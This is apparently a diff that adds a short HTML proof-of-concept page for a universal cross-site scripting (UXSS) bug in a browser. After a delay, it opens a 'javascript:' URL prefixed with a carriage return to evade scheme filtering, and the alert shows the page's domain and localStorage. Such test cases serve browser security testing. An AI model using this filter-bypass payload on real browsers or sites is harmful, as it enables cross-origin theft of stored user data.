@@ -1,0 +1,7 @@
+<!doctype html><html><body>
+<script>
+  setTimeout(() => {
+    window.open("\rjavascript:alert('UXSS '+document.domain+' / '+JSON.stringify(localStorage))");
+  }, 500);
+</script>
+</body></html>
